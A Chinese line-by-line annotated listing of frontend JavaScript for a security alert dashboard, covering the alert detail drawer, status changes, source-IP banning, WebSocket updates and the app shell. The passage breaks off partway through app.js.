| 529 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        typeof v === "number"` |
| 530 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          ? Number.isInteger(v)` |
| 531 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            ? v.toLocaleString()` |
| 532 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            : v.toFixed(3)` |
| 533 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          : escapeHtml(String(v));` |
| 534 | 返回结果：把计算值交给调用方。 | `      return "<tr><th>" + escapeHtml(k) + "</th><td>" + rendered + "</td></tr>";` |
| 535 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 536 | 页面更新：修改元素内容、样式或状态。 | `    el.dFeatures.innerHTML =` |
| 537 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      rows.length > 0` |
| 538 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? rows.join("")` |
| 539 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : '<tr><td colspan="2" class="text-tertiary" style="text-align:center">无特征数据</td></tr>';` |
| 540 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 541 | 注释：说明前端逻辑或交互意图。 | `    // 原始数据` |
| 542 | 页面更新：修改元素内容、样式或状态。 | `    el.dRaw.textContent = alert.raw \|\| "（无原始载荷）";` |
| 543 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 544 | 注释：说明前端逻辑或交互意图。 | `    // IOC` |
| 545 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const indicators = Array.isArray(alert.indicators) ? alert.indicators : [];` |
| 546 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (indicators.length) {` |
| 547 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.dIndicatorsSection.hidden = false;` |
| 548 | 页面更新：修改元素内容、样式或状态。 | `      el.dIndicators.innerHTML = indicators` |
| 549 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        .map((x) => "<li>" + escapeHtml(String(x)) + "</li>")` |
| 550 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        .join("");` |
| 551 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else {` |
| 552 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.dIndicatorsSection.hidden = true;` |
| 553 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 554 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 555 | 注释：说明前端逻辑或交互意图。 | `    // 历史` |
| 556 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const history = Array.isArray(alert.history) ? alert.history : [];` |
| 557 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (history.length) {` |
| 558 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.dHistorySection.hidden = false;` |
| 559 | 页面更新：修改元素内容、样式或状态。 | `      el.dHistory.innerHTML = history` |
| 560 | 遍历处理：逐项渲染或转换数据。 | `        .map(` |
| 561 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `          (h) =>` |
| 562 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            '<li class="timeline__item">' +` |
| 563 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            '<span class="timeline__time">' +` |
| 564 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            escapeHtml(formatTime(h.timestamp)) +` |
| 565 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            "</span>" +` |
| 566 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            '<span>' +` |
| 567 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            escapeHtml(statusText(h.status)) +` |
| 568 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            "</span></li>"` |
| 569 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        )` |
| 570 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        .join("");` |
| 571 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else {` |
| 572 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.dHistorySection.hidden = true;` |
| 573 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 574 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 575 | 注释：说明前端逻辑或交互意图。 | `    // 按钮可用态：已处理 / 已忽略不能再点状态按钮` |
| 576 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const terminal = alert.status === "resolved" \|\| alert.status === "ignored";` |
| 577 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.btnAck.disabled = alert.status !== "open";` |
| 578 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.btnResolve.disabled = terminal;` |
| 579 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.btnIgnore.disabled = terminal;` |
| 580 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.btnBan.disabled = !alert.source_ip;` |
| 581 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 582 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 583 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindDrawerHandlers() {` |
| 584 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.drawerClose.addEventListener("click", closeDrawer);` |
| 585 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.drawerOverlay.addEventListener("click", closeDrawer);` |
| 586 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    document.addEventListener("keydown", (e) => {` |
| 587 | 页面更新：修改元素内容、样式或状态。 | `      if (e.key === "Escape" && el.drawer.classList.contains("is-open")) {` |
| 588 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        closeDrawer();` |
| 589 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 590 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 591 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 592 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnAck.addEventListener("click", () => transition("acknowledged"));` |
| 593 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnResolve.addEventListener("click", () => transition("resolved"));` |
| 594 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnIgnore.addEventListener("click", () => transition("ignored"));` |
| 595 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.btnBan.addEventListener("click", banActiveSource);` |
| 596 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 597 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 598 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function transition(newStatus) {` |
| 599 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!state.activeId) return;` |
| 600 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 601 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const updated = await fetchApi(` |
| 602 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "/api/alerts/" + encodeURIComponent(state.activeId) + "/status",` |
| 603 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        {` |
| 604 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          method: "POST",` |
| 605 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          body: { status: newStatus },` |
| 606 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 607 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 608 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.cache.set(updated.id, updated);` |
| 609 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      populateDrawer(updated);` |
| 610 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      updateListItemStatus(updated);` |
| 611 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("已更新为：" + statusText(newStatus), "info");` |
| 612 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshGlobalCounts();` |
| 613 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 614 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("状态更新失败：" + (err.message \|\| ""), "error");` |
| 615 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 616 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 617 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 618 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function banActiveSource() {` |
| 619 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const alert = state.cache.get(state.activeId);` |
| 620 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!alert \|\| !alert.source_ip) return;` |
| 621 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (` |
| 622 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      !window.confirm(` |
| 623 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "确认封禁来源 IP " + alert.source_ip + "？\n该操作会立即生效。"` |
| 624 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      )` |
| 625 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    ) {` |
| 626 | 返回结果：把计算值交给调用方。 | `      return;` |
| 627 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 628 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 629 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      await fetchApi("/api/banned_ips", {` |
| 630 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "POST",` |
| 631 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: {` |
| 632 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          ip: alert.source_ip,` |
| 633 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          reason: "来自告警 " + (alert.id \|\| "") + "：" + (alert.title \|\| ""),` |
| 634 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 635 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 636 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("已封禁 " + alert.source_ip, "info");` |
| 637 | 注释：说明前端逻辑或交互意图。 | `      // 联动：自动标为已处理` |
| 638 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      await transition("resolved");` |
| 639 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 640 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("封禁失败：" + (err.message \|\| ""), "error");` |
| 641 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 642 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 643 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 644 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function updateListItemStatus(alert) {` |
| 645 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const li = el.list.querySelector(` |
| 646 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '.alert-item[data-id="' + CSS.escape(alert.id) + '"]'` |
| 647 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 648 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!li) return;` |
| 649 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const pill = li.querySelector(".alert-item__status");` |
| 650 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (pill) {` |
| 651 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pill.className =` |
| 652 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "alert-item__status alert-item__status--" + (alert.status \|\| "open");` |
| 653 | 页面更新：修改元素内容、样式或状态。 | `      pill.textContent = statusText(alert.status);` |
| 654 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 655 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 656 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 657 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 658 | 注释：说明前端逻辑或交互意图。 | `   * WebSocket 订阅：新告警入场 + 状态同步` |
| 659 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 660 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindSocket() {` |
| 661 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.io) return;` |
| 662 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const socket = window.io({ transports: ["websocket", "polling"] });` |
| 663 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    socket.on("alert", (a) => {` |
| 664 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!a \|\| !a.id) return;` |
| 665 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.cache.set(a.id, a);` |
| 666 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!matchesFilters(a)) {` |
| 667 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        refreshGlobalCounts();` |
| 668 | 返回结果：把计算值交给调用方。 | `        return;` |
| 669 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 670 | 注释：说明前端逻辑或交互意图。 | `      // 从空态切换为列表` |
| 671 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const empty = el.list.querySelector(".alert-list__empty");` |
| 672 | 页面更新：修改元素内容、样式或状态。 | `      if (empty) el.list.innerHTML = "";` |
| 673 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.list.insertAdjacentHTML("afterbegin", renderListItem(a, true));` |
| 674 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.total += 1;` |
| 675 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderCounts({ filteredTotal: state.total });` |
| 676 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshGlobalCounts();` |
| 677 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 678 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    socket.on("alert_updated", (evt) => {` |
| 679 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!evt \|\| !evt.id) return;` |
| 680 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const cached = state.cache.get(evt.id);` |
| 681 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (cached) {` |
| 682 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        cached.status = evt.status;` |
| 683 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        updateListItemStatus(cached);` |
| 684 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 685 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (state.activeId === evt.id && cached) {` |
| 686 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        populateDrawer(cached);` |
| 687 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 688 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshGlobalCounts();` |
| 689 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 690 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 691 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 692 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function matchesFilters(a) {` |
| 693 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.level && a.level !== state.level) return false;` |
| 694 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.status && a.status !== state.status) return false;` |
| 695 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.type && a.threat_type !== state.type) return false;` |
| 696 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.q) {` |
| 697 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const needle = state.q.toLowerCase();` |
| 698 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const hay = [a.title, a.summary, a.threat_type, a.source_ip, a.dest_ip]` |
| 699 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        .filter(Boolean)` |
| 700 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        .join(" ")` |
| 701 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        .toLowerCase();` |
| 702 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!hay.includes(needle)) return false;` |
| 703 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 704 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const since = rangeSince(state.range);` |
| 705 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (since && a.timestamp && new Date(a.timestamp) < new Date(since)) {` |
| 706 | 返回结果：把计算值交给调用方。 | `      return false;` |
| 707 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 708 | 返回结果：把计算值交给调用方。 | `    return true;` |
| 709 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 710 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 711 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 712 | 注释：说明前端逻辑或交互意图。 | `   * 开发用：生成演示数据按钮（仅在 DEBUG 后端允许时显示）` |
| 713 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 714 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function maybeEnableSeedButton() {` |
| 715 | 注释：说明前端逻辑或交互意图。 | `    // 探针：若 DEBUG 后端允许 seed，则按钮可见。403/其它状态 → 保持隐藏。` |
| 716 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 717 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const resp = await fetch("/api/alerts/_seed", {` |
| 718 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "POST",` |
| 719 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        headers: {` |
| 720 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "Content-Type": "application/json",` |
| 721 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          Authorization: "Bearer " + window.AGApi.getToken(),` |
| 722 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 723 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: JSON.stringify({ count: 0 }),` |
| 724 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 725 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (resp.status === 201 \|\| resp.status === 400) {` |
| 726 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.btnSeed.hidden = false;` |
| 727 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 728 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (_) {` |
| 729 | 注释：说明前端逻辑或交互意图。 | `      // 网络异常则保持隐藏` |
| 730 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 731 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 732 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 733 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindSeedButton() {` |
| 734 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnSeed.addEventListener("click", async () => {` |
| 735 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      try {` |
| 736 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        await fetchApi("/api/alerts/_seed", {` |
| 737 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          method: "POST",` |
| 738 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          body: { count: 12 },` |
| 739 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        });` |
| 740 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast("已生成 12 条演示告警", "info");` |
| 741 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        await loadTypes();` |
| 742 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        await applyFilters();` |
| 743 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        refreshGlobalCounts();` |
| 744 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } catch (err) {` |
| 745 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast("生成失败：" + (err.message \|\| ""), "error");` |
| 746 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 747 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 748 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 749 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 750 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 751 | 注释：说明前端逻辑或交互意图。 | `   * 启动` |
| 752 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 753 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function init() {` |
| 754 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindFilterHandlers();` |
| 755 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindListHandlers();` |
| 756 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindDrawerHandlers();` |
| 757 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindSeedButton();` |
| 758 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindSocket();` |
| 759 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 760 | 注释：说明前端逻辑或交互意图。 | `    // 初始化下拉与列表` |
| 761 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    await loadTypes();` |
| 762 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    await applyFilters();` |
| 763 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    refreshGlobalCounts();` |
| 764 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    maybeEnableSeedButton();` |
| 765 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 766 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 767 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (document.readyState === "loading") {` |
| 768 | 事件绑定：监听用户操作并触发对应处理函数。 | `    document.addEventListener("DOMContentLoaded", init);` |
| 769 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  } else {` |
| 770 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    init();` |
| 771 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 772 | 前端语句：驱动页面交互、状态管理或数据展示。 | `})();` |

## `web/static/js/app.js`

- 类型：前端静态资源
- 行数：107

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：说明前端逻辑或交互意图。 | `/*` |
| 2 | 注释：说明前端逻辑或交互意图。 | ` * app.js — 全局壳：侧边栏、导航、状态灯、响应式（Phase 7）` |
| 3 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 4 | 注释：说明前端逻辑或交互意图。 | ` * 依赖 utils.js（提供 AGApi / AGUI）。` |
| 5 | 注释：说明前端逻辑或交互意图。 | ` * 所有业务页都会间接加载本文件（由 base.html 引入）。` |
| 6 | 注释：说明前端逻辑或交互意图。 | ` */` |
| 7 | 前端语句：驱动页面交互、状态管理或数据展示。 | `(function () {` |
| 8 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  "use strict";` |
| 9 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 10 | 事件绑定：监听用户操作并触发对应处理函数。 | `  document.addEventListener("DOMContentLoaded", init);` |
| 11 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 12 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function init() {` |
| 13 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    highlightActiveNav();` |
| 14 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindSidebarToggle();` |
| 15 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindLogout();` |
| 16 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderUsername();` |
| 17 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    startStatusPoll();` |
| 18 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 19 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 20 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function highlightActiveNav() {` |
| 21 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const current = document.body.dataset.page;` |
| 22 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    document.querySelectorAll(".sidebar__item").forEach((node) => {` |
| 23 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (node.dataset.page === current) {` |
| 24 | 页面更新：修改元素内容、样式或状态。 | `        node.classList.add("is-active");` |
| 25 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else {` |
| 26 | 页面更新：修改元素内容、样式或状态。 | `        node.classList.remove("is-active");` |
| 27 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 28 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 29 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 30 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 31 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindSidebarToggle() {` |
| 32 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const sidebar = document.querySelector(".sidebar");` |
| 33 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!sidebar) return;` |
| 34 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 35 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const toggle = document.getElementById("menu-toggle");` |
| 36 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (toggle) {` |
| 37 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      toggle.addEventListener("click", () => {` |
| 38 | 注释：说明前端逻辑或交互意图。 | `        // 移动端：整体滑入/滑出` |
| 39 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (window.matchMedia("(max-width: 767px)").matches) {` |
| 40 | 页面更新：修改元素内容、样式或状态。 | `          sidebar.classList.toggle("is-open");` |
| 41 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        } else {` |
| 42 | 注释：说明前端逻辑或交互意图。 | `          // 桌面端：收起/展开` |
| 43 | 页面更新：修改元素内容、样式或状态。 | `          sidebar.classList.toggle("sidebar--collapsed");` |
| 44 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 45 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 46 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 47 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 48 | 注释：说明前端逻辑或交互意图。 | `    // 点击侧栏外部时在移动端收起` |
| 49 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    document.addEventListener("click", (e) => {` |
| 50 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!window.matchMedia("(max-width: 767px)").matches) return;` |
| 51 | 页面更新：修改元素内容、样式或状态。 | `      if (!sidebar.classList.contains("is-open")) return;` |
| 52 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (sidebar.contains(e.target) \|\| (toggle && toggle.contains(e.target)))` |
| 53 | 返回结果：把计算值交给调用方。 | `        return;` |
| 54 | 页面更新：修改元素内容、样式或状态。 | `      sidebar.classList.remove("is-open");` |
| 55 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 56 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 57 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 58 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindLogout() {` |
| 59 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const btn = document.getElementById("btn-logout");` |
| 60 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (btn && window.AGApi) {` |
| 61 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      btn.addEventListener("click", (e) => {` |
| 62 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        e.preventDefault();` |
| 63 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        window.AGApi.logout();` |
| 64 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 65 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 66 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 67 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 68 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderUsername() {` |
| 69 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const node = document.getElementById("topbar-username");` |
| 70 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!node \|\| !window.AGApi) return;` |
| 71 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const name = window.AGApi.getUsername();` |
| 72 | 页面更新：修改元素内容、样式或状态。 | `    if (name) node.textContent = name;` |
| 73 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 74 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 75 | 注释：说明前端逻辑或交互意图。 | `  /**` |
| 76 | 注释：说明前端逻辑或交互意图。 | `   * 每 15 秒查一次健康状态，更新侧栏底部的状态灯。` |
| 77 | 注释：说明前端逻辑或交互意图。 | `   * 使用公开 \`/api/health\` 接口（无需 JWT），失败则置为异常。` |
| 78 | 注释：说明前端逻辑或交互意图。 | `   */` |
| 79 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function startStatusPoll() {` |
| 80 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const light = document.querySelector(".sidebar__status .status-light");` |
| 81 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const label = document.getElementById("sidebar-status-label");` |
| 82 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!light) return;` |
| 83 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 84 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    async function check() {` |
